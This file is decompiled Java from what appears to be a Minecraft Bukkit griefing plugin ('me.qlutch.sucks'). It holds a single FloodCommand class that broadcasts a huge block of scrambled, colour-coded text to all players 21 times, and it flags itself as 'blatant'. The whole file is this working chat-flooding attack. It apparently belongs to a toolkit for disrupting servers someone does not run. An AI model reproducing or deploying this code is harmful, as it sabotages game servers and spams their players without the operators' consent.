/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class FloodCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        String flood = "§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood§a§kFlood§b§kFlood§1§kFlood§2§kFlood§3§kFlood§4§kFlood§5§kFlood§6§kFlood§7§kFlood§8§kFlood§9§kFlood§f§kFlood";
        for (int x2 = 0; x2 <= 20; ++x2) {
            Bukkit.broadcastMessage((String)flood);
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

